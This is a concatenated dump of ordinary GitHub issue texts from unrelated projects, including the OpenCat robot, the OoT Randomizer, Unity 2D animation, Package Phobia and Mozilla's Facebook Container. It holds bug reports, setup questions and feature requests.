 Thanks for your time ^_^ I've been using 2S lipo batteries(7.4~8.4V) to directly power the servos. The servo's specification lists a maximal torque at 6.6V, but it works fine under 8.4V with some heating.

I hope to reduce the voltage to the safe 6.6V range. However when I connect some step down boards (9v to 6V, 3A max) in serial with the same 2S batteries, the output voltage will drop below 5V. It seems that the board will shutdown once peak current is higher than some threshold.

Do you know any cheap and neat solution to create a (6V, 5+ Amp) supply from the 2S lipo batteries? Thanks! Hi,
In the Code tab there is written that info about partecipation to the project can be find in the wiki tab but there no such info. Then I tryed to open the manual of Assembling instructions (mini kit) from table of content and there is nothing there.
Can you please tell us how can we help you and how can I have the open cat and try to develop it sharing info with you?
BR,
Aliaksei To start, I'm a fan of this project, even if I'm not a hardware developer, for what you want to accomplish. In short term I cannot help with code or specific things related to the opencat itself, I guess that the most non-generic help [that I'm doing witch at some point could be more pertinent with this project is a working group about ChatOps](https://github.com/fititnt/chatops-wg/issues). Anyway, as start, there are few 'undesired, but necessary jobs' that helps promote something that could be easier to me or colleagues to start and explain how to maintain. This is one of they.

----

The <https://www.petoi.com/> now is hosted on Wix. One alternative is use GitHub Pages <https://pages.github.com/> to host the pages, stick with the static generator Jekyll which helps with some repetitive tasks and have some themes <http://jekyllthemes.org/>, then configure a custon domain with CNAME file and still able to use SSL for free without need to pay for hosting, put the website on a free cloudflare account.

Even if the main website still on Wix (I can understand that is faster in sort term) this could still be done later with information related to documentation or for what the [Wiki on this repository](https://github.com/PetoiCamp/OpenCat/wiki) is used. 


If have interest, I could personally help with the start here. The first steps could take a lot of time to understand the basics, but after is configured, is relative simple to maintain, and I could document how to do it. Is not far from just add markdown files in a directory and still allows contributions from people outside the project via pull requests.

## Some some examples

- https://github.com/pokemongovet/pokemongovet.github.io & https://pokemongovet.github.io/
- https://github.com/webiwg/acessibilidade-web-pt & http://acessibilidade.pt.webiwg.org/

 Here is the BOM based on the https://www.hackster.io/petoi/opencat-845129, If you continue to up your have the BOM list ready

Hardware components:
SparkFun Arduino Pro Mini 328 - 5V/16MHz × 1
https://www.sparkfun.com/products/11113

Raspberry Pi 3 Model B or B+ × 1
https://www.raspberrypi.org/products/raspberry-pi-3-model-b/
https://www.raspberrypi.org/products/raspberry-pi-3-model-b-plus/

Adafruit PCA9685 PWM & servo driver × 1
https://www.adafruit.com/product/815

Micro SD card × 1
Heat sink × 2
Compression spring × 13
Torque spring × 4
Extension spring × 1
Flat self-tapping screws (various) × 1
Rivets (various) × 1
Infrared sensor and remote × 1
Buzzer × 1
Amplifier × 1
Cellphone speaker × 1
USB microphone × 1
Capacitor × 1
Resistor (various) × 1
18650/18500 batteries × 2
Battery holder × 1
MG92B servo × 13
MG91 servo × 1
Longer servo screw × 14
Pi noir fisheye camera with lights × 1
ToF lidar × 3
Adafruit Capacitive Touch Sensor Breakout - MPR121 × 1
GY-521 MPU-6050 3 Axis Gyroscope + Accelerometer Module For Arduino × 1
Slide Switch × 1
Male/female pin connector (various) × 1
Flat washer × 14
Lock washer × 14
Right angle connector × 1
Rainbow wires × 1
USB to micro USB cable × 1
SparkFun FTDI Basic Breakout - 5V × 1
Pan/tilt holder × 1
Heat shrink tubing × 1
Electrical tape The following text is one example output in the serial monitor:
```
⸮
* Starting *
Initializing I2C
Connecting MPU6050...
Testing connections...
MPU successful
Initializing DMP...
794 148 19 61 
Enabling DMP...
Enabling interrupt detection
DMP ready!
⸮
* Starting *
Initializing I2C
Connecting MPU6050...
Testing connections...
MPU successful
Initializing DMP...
794 148 19 61 
Enabling DMP...
Enabling interrupt detection
DMP ready!
```
I'm not sure where the ⸮ symbol comes from. And the sketch may start twice at the beginning. Any ideas? Maybe it's related to the timing around Serial.begin(). That's why I'm having `  Serial.setTimeout(5);` or
`while (Serial.available() && Serial.read());`
for clearing the serial buffer. 
But the "⸮" and duplicated/reboot information still appear.

Any ideas? I like to help, I can create a document on assembling the STL also I can convert the STL into step file. Is this project authorized?

If we use this open source code for simple development, such as Bluetooth version or other, to make a basic mechanical cat, can we manufacture and sell it? I'm building a robot, which is suggested to be compatible with the opencat software. Here: [https://www.personalrobots.biz/spotmicro-is-an-open-source-robotic-dog/](url)

Though it uses an Arduino mega and I already bought all other hardware. I would like to know if there is a schematic of the pcb so I can connect everything like on the pcb. 

I also see that Nibble's rear legs bend the other way, can I adjust that in the code? Hi, 
I have noticed some strange error message from the MPU6050 codes borrowed from the popular [i2cdevlib](https://github.com/jrowberg/i2cdevlib/tree/master/Arduino/MPU6050):
The [MPU6050 test code](https://github.com/PetoiCamp/OpenCat/tree/master/ModuleTests/testMPU) will show error message "MPU6050 connection failed", but the following codes can read all the sensor data just fine. And it seems to be a rare but [reproducible](https://community.cypress.com/thread/33264?start=0&tstart=0) error across several forums. 

Basically it's the function **mpu.testConnection()** always returns false. My current solution is just ignoring the error message since it's not affecting any later use on the sensor data. But does anyone have better insight why it is happening? Thanks!
 PIC32MX and PIC32MZ MCUs are vastly faster than AVR, while retaining almost all of the ease of programming via Chipkit's Arduino framework and since Microchip has bought Atmel it is the same company anyway.

A 40Mhz PIC32MX270 chip is very similar to an Arduino Leonardo (see the Chipkit Lenny) but offers much stronger performance and native 32bit instead of 8bit. There is also the MX274 80Mhz chip but it isn't well supported yet by Chipkit. Some of the MZ series chips are as fast as 250Mhz and up to 32MB of DDR on package.

I've developed some things for work and the additional speed is amazing things that too several ms on an AVR can be done in uS on a  PIC32 for about the same price.  

Another Idea is to use the IRDA UART built into PIC32 to allow the cats to talke to each other and some IR devices via IRDA.

I think this could allow the balancing algorithm to run a lot faster and work better than on AVR perhaps and with less coding effort to make it fast on a slow MCU.
 Hi, 
I have noticed some strange error message from the MPU6050 codes borrowed from the popular [i2cdevlib](https://github.com/jrowberg/i2cdevlib/tree/master/Arduino/MPU6050):
The [MPU6050 test code](https://github.com/PetoiCamp/OpenCat/tree/master/ModuleTests/testMPU) will occasionally show error message "MPU6050 connection failed", but the following codes can read all the sensor data just fine. And it seems to be a rare but [reproducible](https://community.cypress.com/thread/33264?start=0&tstart=0) error across several forums. 

Basically it's the function **mpu.testConnection()** always returns false. My current solution is just ignoring the error message since it's not affecting any later use on the sensor data. But does anyone have better insight why it is happening? Thanks!

<---------->
124948761
Seed URL: https://ootrandomizer.com/seed/get?id=138464

OoT Randomizer Version 4.0.0 Release  -  Seed: KLUAX7AB6F (glitchless)

File Select Hash:
    Boss Key
    Map
    Kokiri Tunic
    Deku Stick
    Hammer

Bottom of the Well MQ East Inner Room Freestanding Key:   Zeldas Lullaby

In the MQ-version of the BotW the central room is locked. To open the gates you have to play Zelda's Lullaby standing on the Triforce symbol on the outer ring. So how can I reach Zelda's Lullaby without Zelda's Lullaby? i cannot find the last small key to clear the light trial in ganons castle. i have the big key, but the white energy field is still around the door. Anyone else?

Error during Host Server: .\bizhawk-co-op\sync.lua:14: Created global variable "require_status".
Didn't you want this to be local?
If you actually wanted a global variable,
use the "declare" function instead.

also cant join any room  Apparently, you can overflow the text by using multiple settings that influence texts in the game.
This combination seems legit, but cannot be generated.

`--tokensanity all --logic_tricks --enhance_map_compass --shuffle_mapcompass keysanity --shuffle_smallkeys keysanity --shuffle_bosskeys keysanity --shopsanity 4` 

is already enough to cause the error, in this case:
` Traceback (most recent call last):
  File "OoTRandomizer.py", line 62, in <module>
  File "OoTRandomizer.py", line 59, in start
  File "Main.py", line 137, in main
  File "Patches.py", line 1532, in patch_rom
  File "Messages.py", line 745, in repack_messages
TypeError: Message Text table is too large: 0x381b4 written / 0x38130 allowed.
[16475] Failed to execute script OoTRandomizer
`
The Issue mostly seems to be related to the --enhance_map_compass setting. Anyone else?

Error during Host Server: .\bizhawk-co-op\sync.lua:14: Created global variable "require_status".
Didn't you want this to be local?
If you actually wanted a global variable,
use the "declare" function instead.

also cant join any room   Title.  Running compressed devbuild ROM on Mupen64Plus core.  Have not yet gotten to any other locked doors to see if it's a small key thing or just a chest game thing. Seed: D44SK9VVGKBAAKAJ2B_UTYNQOQFWX

For this seed, the last shadow temple small key is behind a key-locked door. This makes me unable to beat the shadow temple. In the same run, the fire medallion is in the shadow temple, and so i can't go to Ganon's castle without beating the Shadow Temple. Any advice on what i can do? 

I checked the spoiler text after i spent way too much time searching.

Image of map: https://i.imgur.com/vA6A5P5.png
Note, red line is to show where the locked door is. One of the three chests on the Shadow Temple map has a small key. Title.  Running compressed devbuild ROM on Mupen64Plus core.  Have not yet gotten to any other locked doors to see if it's a small key thing or just a chest game thing. Think I might have found impossible Seed

OoT Randomizer Version v3.0  -  Seed: EU04WBO3XQ

Need Keys for Fire Temple to progress for last Medallion to open up Ganons Castle

One in Haunted Wasteland Structure - Cannot Access as Gerudo Card Is in Ganons Castle
Other in Gerudo Training Grounds Maze Right Central Chest - Again Cannot Access as Ganons Castle.

So basically.... to get to Ganons Castle, I need an item that is in Ganons Castle Where is it? The song of time is there, but I can't find it. I can't get into the locked door past the crawl space because I don't have enough keys, so I assume it's not there. It's not possible to get softlocked by using a key on the wrong door, is it? Hey!

So, I'm trying to generate a seed to use through RetroArch, and I don't know where to get
a working base ROM. I downloaded one from a Reddit thread but its a .rar file. Where would I
look to get a working ROM? Other than that, this randomizer is awesome. Hey!

So, I'm trying to generate a seed to use through RetroArch, and I don't know where to get
a working base ROM. I downloaded one from a Reddit thread but its a .rar file. Where would I
look to get a working ROM? Other than that, this randomizer is awesome. Seed URL: https://ootrandomizer.com/seed/get?id=138464

OoT Randomizer Version 4.0.0 Release  -  Seed: KLUAX7AB6F (glitchless)

File Select Hash:
    Boss Key
    Map
    Kokiri Tunic
    Deku Stick
    Hammer

Bottom of the Well MQ East Inner Room Freestanding Key:   Zeldas Lullaby

In the MQ-version of the BotW the central room is locked. To open the gates you have to play Zelda's Lullaby standing on the Triforce symbol on the outer ring. So how can I reach Zelda's Lullaby without Zelda's Lullaby? According to my seed, I was supposed to start out with the Zora's Sapphire but I didn't. Also, the boss key is impossible because I need the Mask of Truth to show to the Deku Shrubs in the Lost Woods and it didn't register it the 4th prison key for Gerudo Fortress is also impossible without the Zora's Sapphire since Zelda would've thrown it in the moat, instead of the Ocarina of Time. What do I do? I can still have access to Ganondorf/Ganon, but I want to get everything.  Also, other chests had duplicate items, of which I've already obtained.

Seed: 141168_ZGD5SANZZO RandoVersion: Oot Randomizer 3.13.18 f.LUM
Bizhawk Version: Version 2.2.2 (x64) (GIT release #218d75c)
Settings String: BRWY2DA29XMBAWAASASFBXCMA
Seed: 011920191
OS: Windows 10 x64

Filename: OoT_EF034_011920191

OoT Randomizer Version 3.13.18 f.LUM - Cosmetics Log

Default Targeting Option:                switch
Background Music:                        off
Display D-Pad HUD:                       True

Colors:

Kokiri Tunic:                            Completely Random (#E8C954)
Goron Tunic:                             Completely Random (#C071AA)
Zora Tunic:                              Completely Random (#46FD66)
Navi Idle:                               Completely Random (#E53465)
Navi Targeting Enemy:                    Completely Random (#CB8B27)
Navi Targeting NPC:                      Completely Random (#CF962A)
Navi Targeting Prop:                     Completely Random (#36D7FD)
Inner Initial Sword Trail:               Rainbow (#36D7FD)
Outer Initial Sword Trail:               Rainbow (#36D7FD)
Sword Trail Duration:                    15

SFX:

Navi - Overworld:                        cluck
Navi - Enemy:                            bark
Low Health:                              silver-rupee
Menu Cursor:                             gunshot
Menu Select:                             goron-wake
Nightfall:                               talon-hmm
Horse Neigh:                             child-owo
Hover Boots:                             ruto-lift
Ocarina:                                 whistle


On the 3rd straight reward of bombchu bowling, on Bizhawk, this is the screen that shows

![image](https://user-images.githubusercontent.com/4006604/51432449-c8242a80-1bfd-11e9-840e-6eead1211e75.png)

Crashes and the usual deletes the save file on reopen. A sheika stone told me that iron boots are inside Ganon's Castle. How do I enter the water temple then? I already have longshot and the longshot. I know there are some methods to enter the temple, but I though randomizer was made to be completed glitchless  Whenever I click "Generate Patched Rom", an error shows up saying:

   |-------------------------------------------------------------------|X|
   |    Error while creating seed                                                       
   |                                                                                                     
   |      (X) [WinError 2]  The system cannot find the file specified    
   |                                                                            OK                         
   |---------------------------------------------------------------------|

Please help me with this issue! Whenever I click "Generate Patched Rom", an error shows up saying:

   |---------------------------------------------------------------------|
   |    Error while creating seed                                                    X   
   |                                                                                                     
   |      (X) [WinError 2]  The system cannot find the file specified    
   |                                                                            OK                         
   |---------------------------------------------------------------------|

Please help me with this issue!
<---------->
124992939
The Unity blog article mentioned there's planned support for layered PSDs. Has this been implemented now? The readme doesn't mention it. When running in Editor there is no problem with the memory but when running on mobile device and profiling in either Unity Profiler or Xcode, I can clearly see the memory going up around 1MB/s.

This cause my game to crash on device with low memory. 
Changing scene or GC.Collect() does not free up the memory.

I ran the animation in an empty scene to rule out all other plausible cause and the problem is still there.

Is this a known problem or can it be related to something known?

The problem occurred on multiple platforms and versions and multiple animations.

Unity version : 2018.3.X
iOS : 9.0 to 12
Android : 9 I have a setup for my character where there are some "fake" bones that are animated the usual way and some "real" bones that usually follow the fake bones, but sometimes take on additional rotation during gameplay. This is fine for the most part, but previewing transitions in the Animator doesn't work.
When I was using Anima2D, I made an editor script that would swap which set of bones that the sprites use (fake <-> real) so I could animate properly. This is extra useful here since the bone gizmos are based on these fields.
I can make the change myself, but the package isn't under source control (and I'd have to make the change every update). Although having made the change, the transition previews still don't work, even though everything else does. Bug maybe? i created a sprite mesh with bones and appropriate weights, added the sprite skin component, clicked the create bones button and the bones are populated, but i'm not seeing any bones in the scene view that i can move around and manipulate.  Please see attached file.  Thanks.

![image](https://user-images.githubusercontent.com/652049/48298741-294db600-e477-11e8-84dc-ed7eb65ced95.png)
 I don't know when the changed happened, but Effector and Target were effectively switched. So step 4, 5, and 6 under "Create an Effector" are now incorrect (they just need Effector and Target swapped). In scene _Character  Fei (Missing Prefab)
<---------->
125292414
Hi Miguel,

Thanks for today's update with the new fresh chapter 5. I am trying to install everything via Docker.

When running  `
docker run -it --rm -p 8888:8888 -v "$PWD"/notebooks/:/mnt/notebooks/ mimoralea/gdrl:v0.7`,  then accessing Jupyter, the password you provided looks invalid.

Furthermore, the first line in the console line after running the container is:
```
Container must be run with group "root" to update passwd file
```
Am I missing something? 

Thanks again
 Hi Miguel,

Thanks for today's update with the new fresh chapter 5. I am trying to install everything via Docker.

When running  `
docker run -it --rm -p 8888:8888 -v "$PWD"/notebooks/:/mnt/notebooks/ mimoralea/gdrl:v0.7`,  then accessing Jupyter, the password you provided looks invalid.

Furthermore, the first line in the console line after running the container is:
```
Container must be run with group "root" to update passwd file
```
Am I missing something? 

Thanks again

<---------->
125511330
Hello guys,

I've following custom error class 

```typescript
class TypedError extends Error {
    constructor(message: string, public code: number) {
        super(message)

        // Set the prototype explicitly.
        Object.setPrototypeOf(this, TypedError.prototype)
    }
}
```

which I use in controller like 

```typescript

@Mutation()
raiseAnError() {
    throw new TypedError('Not found', 404)
}
```

however, using the playground I only get following with no `Error.code`


```javascript
"errors": [
    {
      "message": "Not found",
      "locations": [
        {
          "line": 2,
          "column": 3
        }
      ],
      "path": [
        "raiseAnError"
      ]
    }
  ]
```


How can I achieve something like (https://codeburst.io/custom-errors-and-error-reporting-in-graphql-bbd398272aeb)

```javascript
formatError(err) {
    errors.report(err, req);   // <-- log the error
    return {
      message: err.message,
      code: err.originalError && err.originalError.code,   // <--
      locations: err.locations,
      path: err.path
    };
  }```
 Is this project dead? Could you create some configuration so that you can set the default playground URL? I like to use my projects as a default url '/ @' as a playground because besides making it difficult to track common urls, it also makes the query url smaller ... how to upload image in  Mutation?
<---------->
125677298
HACS requires custom_components in repository hi, i am using this component already for a long time, but since today, upgraded to 92.0 , i receive now this error :(

2019-04-25 10:45:20 ERROR (MainThread) [homeassistant.setup] Error during setup of component google_keep
Traceback (most recent call last):
  File "/usr/local/lib/python3.7/site-packages/homeassistant/setup.py", line 156, in _async_setup_component
    component.setup, hass, processed_config)  # type: ignore
AttributeError: module 'custom_components.google_keep' has no attribute 'setup' because API is deprecated, i started to use the new IFTTT component and webhooks

so created an automation, but if you use the data template / body like this : 

```
body : { "action": "call_service", "service": "google_keep.add_to_list", "title":"shoplist", "items":" {{TextField}}" }

    data_template:
      title: '{{ trigger.event.data.title }}'  
      items: '{{ trigger.event.data.items }}'  
```

then it creates an empty item
seems the keyword "items" cant be use here , i think its an internal keyword in this sentence: trigger.event.data.items

so i renamed it to for example:

```
body : { "action": "call_service", "service": "google_keep.add_to_list", "title":"shoplist", "shop_item":" {{TextField}}" }

    data_template:
      title: '{{ trigger.event.data.title }}'  
      items: '{{ trigger.event.data.shop_item }}'  
```

then it does work :)

maybe the readme needs an update? HACS requires custom_components in repository hi, i am using this component already for a long time, but since today, upgraded to 92.0 , i receive now this error :(

2019-04-25 10:45:20 ERROR (MainThread) [homeassistant.setup] Error during setup of component google_keep
Traceback (most recent call last):
  File "/usr/local/lib/python3.7/site-packages/homeassistant/setup.py", line 156, in _async_setup_component
    component.setup, hass, processed_config)  # type: ignore
AttributeError: module 'custom_components.google_keep' has no attribute 'setup' because API is deprecated, i started to use the new IFTTT component and webhooks

so created an automation, but if you use the data template / body like this : 

```
body : { "action": "call_service", "service": "google_keep.add_to_list", "title":"shoplist", "items":" {{TextField}}" }

    data_template:
      title: '{{ trigger.event.data.title }}'  
      items: '{{ trigger.event.data.items }}'  
```

then it creates an empty item
seems the keyword "items" cant be use here , i think its an internal keyword in this sentence: trigger.event.data.items

so i renamed it to for example:

```
body : { "action": "call_service", "service": "google_keep.add_to_list", "title":"shoplist", "shop_item":" {{TextField}}" }

    data_template:
      title: '{{ trigger.event.data.title }}'  
      items: '{{ trigger.event.data.shop_item }}'  
```

then it does work :)

maybe the readme needs an update?
<---------->
125750308
 bn vncgnv
<---------->
125946482
That's just an idea. Example: `got@master` * https://observatory.mozilla.org/analyze/packagephobia.now.sh
* https://securityheaders.com/?q=https%3A%2F%2Fpackagephobia.now.sh%2F&hide=on&followRedirects=on

Personally on Express I use [helmet](https://github.com/helmetjs/helmet), for example:

https://github.com/MaxCDN/bootstrapcdn/blob/develop/app.js#L125-L147

which results in these:

* https://securityheaders.com/?q=https%3A%2F%2Fwww.bootstrapcdn.com%2F&hide=on&followRedirects=on
* https://observatory.mozilla.org/analyze/www.bootstrapcdn.com

CSP should be left last, but the other headers should be easy to add :) I was trying this on my mobile phone, and after entering a keyword, it added a space which results in the wrong package.

I think it would make sense to trim the input? <img width="335" alt="Zrzut ekranu 2019-11-13 o 21 12 27" src="https://user-images.githubusercontent.com/28870390/68801120-b4015c00-065b-11ea-9684-ea6da527d41b.png">

Details tag could be replaced by component with `position: absolute` and show/hide toggle button The node foundation is setting up a [package maintenance team](https://github.com/nodejs/package-maintenance) and we would like to have a point of contact with the package phobia team. 

The node package maintenance team has been tasked with writing the set of rules via which a verified team can step into and assist critical node packages if maintainers request help. 

We are thinking of incorporating the package phobia data into our procedures and would like a point of contact to talk further about it. I'd like something like this to work!

<img width="622" alt="2018-09-11 12 48 30" src="https://user-images.githubusercontent.com/8784712/45338687-0874fb80-b5c1-11e8-88a6-626cbfabc9cc.png">
 Internal Server Error while searching for `realm`. https://packagephobia.now.sh/result?p=realm Nice work but I stumbled upon an error:

Searching for [node](https://packagephobia.now.sh/result?p=node) yields an internal server error:
![2018-09-29-145848_617x516_scrot](https://user-images.githubusercontent.com/21294634/46246063-4e6ef380-c3f8-11e8-8704-c5f964170f3e.png) https://packagephobia.now.sh/result?p=parse-dashboard

Internal server error :( Hi!

I found some elements that could be improved on mobile devices (search button, text formatting etc.). I have already updated some of them in forked repository.
I also think it would be useful to update styles, e.g. use only CSS in JS or add Styled Components. We must hit a timeout or something, but whenever I try https://packagephobia.now.sh/result?p=critical@1.3.2 I git Error 500

Not sure how to solve this. I mean, you could increase the process timeout, but then it might affect the whole site performance. Should improve slightly the results page load time Internal Server Error while searching for `realm`. https://packagephobia.now.sh/result?p=realm - Input @toast-ui/vue-editor

![image](https://user-images.githubusercontent.com/9384365/65148065-0b1af400-da52-11e9-8b89-4ef8f314b3af.png)

- Click search

![image](https://user-images.githubusercontent.com/9384365/65148097-19691000-da52-11e9-8cab-2a7bfab2371a.png)
 ![Screenshot_2019-12-19 Package Phobia](https://user-images.githubusercontent.com/28870390/71178700-08a58180-226f-11ea-9281-fd15c954a8f5.png)
 Hi!

I found some elements that could be improved on mobile devices (search button, text formatting etc.). I have already updated some of them in forked repository.
I also think it would be useful to update styles, e.g. use only CSS in JS or add Styled Components. <img width="813" alt="Zrzut ekranu 2019-11-13 o 21 13 01" src="https://user-images.githubusercontent.com/28870390/68800864-27ef3480-065b-11ea-81ff-d32e96eb857e.png">

Labels could appear cropped (e.g. with `text-overflow: ellipsis`) and the full name would appear when you hover over the chart

 https://help.github.com/en/articles/configuring-npm-for-use-with-github-package-registry

### Proposed look

![image](https://user-images.githubusercontent.com/36894700/65254352-6f928d80-dafc-11e9-9044-c3d835cb33b7.png)

### How to switch?

I suggest adding two new subdomains:

- npm.packagephobia.now.sh - for the NPM registry
- github.packagephobia.now.sh - for the GitHub registry

packagephobia.now.sh would work the same as npm.packagephobia.now.sh

#### Another solution:

`https://packagephobia.now.sh/result?p=got@9.6.0`
⬇️ 
`https://packagephobia.now.sh/result?package=got@9.6.0&registry=npm` ![Screenshot_2019-12-19 Package Phobia](https://user-images.githubusercontent.com/28870390/71178700-08a58180-226f-11ea-9281-fd15c954a8f5.png)
 I think this is useful info, at least in the graph tooltip

Version | Publish Date | Publish Size | Install Size
<---------->
126088430
Facebook Container 1.7.0 in Firefox Dev Edition 67.0b17

### Actual behavior

- "Calculate" button doesn't do anything
- Trip calculator input widget is stuck at midnight on page load

### Expected behavior

- Trip calculator should populate with current time on pageload
- "Calculate" button should calculate trip costs


### Steps to reproduce
1. Visit https://www.modo.coop/plans/#tile-trip-calculator with Facebook Container 1.7.0 installed
2. Mash "Calculate"

### Notes

Disabling Facebook Container restores functionality. Includes checking parent elements for inherited styles:

```
function calcZindex(target) {
  const targetParents = [];

  while (target) {
    targetParents.unshift(target);
    target = target.parentNode;
    const parentZindex = window.getComputedStyle(target).getPropertyValue("z-index");
    if ( parentZindex !== "auto" ) {
      return parseInt(parentZindex, 10) + 1;
    }
  }
  return 0;
}
``` Why does it open Instragram in this container? How to prevent it from doing so? For Instagram I might have a separate Firefox container. Using facebook container, used to work and now it doesn't. 
<!--
  Feel free to ignore this Issue template if you just want to ask or suggest something. If you experience an Issue then please provide all asked informations.

  Note: If "Firefox will: Never remember history" in the Firefox Preferences/Options under "Privacy & Security > History" is selected, then Facebook Container will not work, since Containers aren't available in Private Windows.
-->
- Is "Firefox will: Never remember history" in the Firefox Preferences/Options under "Privacy & Security > History" selected? Yes/No: No
- Are you using Firefox in a Private Window? Yes/No: No
- Can you see a grayed out but ticked Checkbox with the description "Enable Container Tabs" in the Firefox Preferences/Options under "Tabs"? Yes/No: Yes
- Facebook Container Version: 1.6.5
- Operating System + Version: win7
- Firefox Version: 66.02
- Other installed Add-ons + Version + Enabled/Disabled-Status: ublock/ strict popup blocker/adblock plus/ unpay wall all enabled
<!-- To be able to Copy&Paste the full list of your Add-ons navigate to "about:support" and scroll down to "Extensions" -->


### Actual behavior
..

### Expected behavior
..

### Steps to reproduce
1. ..
2. ..
3. ..

### Notes
.. fuckin containerblocks fuckin connecting to fuckin wish.com. shitty design this shit <!--
  Feel free to ignore this Issue template if you just want to ask or suggest something. If you experience an Issue then please provide all asked information.

  Also please make sure that:
  - "Firefox will: Never remember history" in the Firefox Preferences/Options under "Privacy & Security > History" is NOT selected
  - You are NOT using Firefox in a Private Window
  - You can see a grayed out but ticked Checkbox with the description "Enable Container Tabs" in the Firefox Preferences/Options under "Tabs"
-->
- Facebook Container Version:
- Operating System + Version:
- Firefox Version:
- Other installed Add-ons + Version + Enabled/Disabled-Status:
<!-- To be able to copy & paste the full list of your Add-ons navigate to "about:support" and scroll down to "Extensions" -->


### Actual behavior
Very recently (two days before I reported this issue), Facebook suddenly suspects my account as some kind of spammer or has been taken over by a different entity. It gives me a couple of Captchas, asks me to upload my photo (and rejects a lot of them), then locks my account for a bunch of hours. After the first incidence, I log in, and again it does the same. To experiment, I removed Facebook Container from my Firefox and when I was allowed back into Facebook again, no more issues. Coincidence?

### Expected behavior
See above.

### Steps to reproduce
1. Install Facebook Container
2 Log into Facebook
3. ???
4. No Profit!

### Notes
Please investigate, as I don't think this happens to everyone using your app. Still, it might be worth finding out. For now, I won't use your app as I kinda use FB to talk with my friends and family, or until they lock me out again which means FB Container doesn't have anything to do with it. Take care! We want to change the Facebook Container add-on author from “Mozilla” to “Mozilla Firefox”

As I understand it, we’ll need to either create a new AMO user called “Mozilla Firefox” and add it as the author of this add-on, or update the existing “Mozilla” user to “Mozilla Firefox”.

@caitmuenster - which do you suggest? Since moving from working on this some of my patches have been left and this is unfortunate.

https://github.com/mozilla/contain-facebook/pull/128 I think this can be ditched but it's worth verifying.

# MAC Events

The following code in the `containFacebook` method is very costly per request if the user has MAC:
```
  // We have to check with every request if the requested URL is assigned with MAC
  // because the user can assign URLs at any given time (needs MAC Events)
  const macAssigned = await getMACAssignment(options.url);
```

The fix here is to merge the events into MAC which got dropped into this PR but never merged: https://github.com/mozilla/multi-account-containers/pull/1190 I can't find in the add-on settings, or when clicking on the fence badge a way to allow the current site (in my case localhost).

![fbcontainerbad](https://user-images.githubusercontent.com/34572689/60980443-c594c900-a334-11e9-8147-ad66fb2fe042.png)

How do I do that? Thanks.  Message from Validation Tool: `Icons must be square.`

Applies to the following files: 
- `/src/img/fbc-icon.svg`
- `/src/img/fbc-icon2.svg`

![image](https://user-images.githubusercontent.com/2692333/63279634-f38ff600-c26e-11e9-906f-d5ce2011742d.png)
 I would like to log in with Facebook on https://taongafarm.com. How can I add an exception for it? <!--
  Feel free to ignore this Issue template if you just want to ask or suggest something. If you experience an Issue then please provide all asked information.

  Also please make sure that:
  - "Firefox will: Never remember history" in the Firefox Preferences/Options under "Privacy & Security > History" is NOT selected
  - You are NOT using Firefox in a Private Window
  - You can see a grayed out but ticked Checkbox with the description "Enable Container Tabs" in the Firefox Preferences/Options under "Tabs"
-->
- Facebook Container Version: 2.0.1
- Operating System + Version: Win 10
- Firefox Version: 68.0.1 (68 bit)
<!-- To be able to copy & paste the full list of your Add-ons navigate to "about:support" and scroll down to "Extensions" -->

### Actual behavior
1. Visit the following URL: https://www.929.org.il/lang/en/page/154/post/49323
2. A purple exclamation point appears on the extension's fence icon in the top toolbar.
3. All the content of the page disappears (after a brief flicker)!
4. Clicking on the fence icon, and then "sites you've allowed" it says I can allow sites in the container, but there are no options to do this.

### Expected behavior
1. Ideally, the site would work outside of the Facebook container.
2. If not, I'd expect an "allow this site in the Facebook container" option in the pop-up to make an exception for this site.


 As depicted in https://mozilla.invisionapp.com/share/52QH95R7CTV#/screens/348257325

First panel after install ...

![image](https://user-images.githubusercontent.com/71928/53268113-d35df080-36aa-11e9-9cb2-3ee3dcce6c81.png)

Clicking "next" should go to the next panel ...

![image](https://user-images.githubusercontent.com/71928/53268292-4a938480-36ab-11e9-9e41-0ed23466c4ca.png)


Note: icon is not final yet; can use a substitute icon for now. - [x] Refactor `detectFacebookOnPage`/`PATTERN` Blocks to reuse code better 
- [x] Revise `positionFacebookBadge` function to assume first arg is always a selector, and remove object detection 
 ![image](https://user-images.githubusercontent.com/71928/53268358-76af0580-36ab-11e9-9207-64d1ee795bad.png)

Note: Can start with the plain "briefcase" container icon we currently use. Adding the FB container logo icon will require a platform change, or privileged code that will require a Mozilla-signed add-on. https://mozilla.invisionapp.com/share/WNREP95GJ4V#/screens/356618743 See https://mozilla.invisionapp.com/share/WNREP95GJ4V#/screens/356618742

* [ ] FB trackers annotated with fence icon
* [ ] On hover, a tooltip is displayed
* [ ] On clicking tracker button, in-context pop-up appears to warn the user To increase protection from Facebook, 2.0 will fully block all Facebook sub-resources. See https://mozilla.invisionapp.com/share/WNREP95GJ4V#/screens/356618740

The in-code add-on description should be updated to match the AMO listing.
<---------->
126104193
What software license is this code under?
<---------->
126178683
<!--
如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。
提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way
-->

**我确定我已经查看了** (标注`[ ]`为`[x]`)

- [x] [Halo 使用文档](https://halo.run/docs)
- [x] [Halo 论坛](https://bbs.halo.run)
- [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
- [x] [其他 Issues](https://github.com/halo-dev/halo/issues)

----

**我要申请**  (标注`[ ]`为`[x]`)

- [ ] BUG 反馈
- [x] 添加新的特性或者功能
- [ ] 请求技术支持
 <!--
如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。
提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way
-->

**我确定我已经查看了** (标注`[ ]`为`[x]`)

- [x] [Halo 使用文档](https://halo.run/docs)
- [x] [Halo 论坛](https://bbs.halo.run)
- [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
- [x] [其他 Issues](https://github.com/halo-dev/halo/issues)

----

**我要申请**  (标注`[ ]`为`[x]`)

- [ ] BUG 反馈
- [x] 添加新的特性或者功能
- [ ] 请求技术支持
 <!--
如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。
提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way
-->

**我确定我已经查看了** (标注`[ ]`为`[x]`)

- [x] [Halo 使用文档](https://halo.run/docs)
- [x] [Halo 论坛](https://bbs.halo.run)
- [x] [Github Wiki 常见问题](https://github.com/halo-dev/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98)
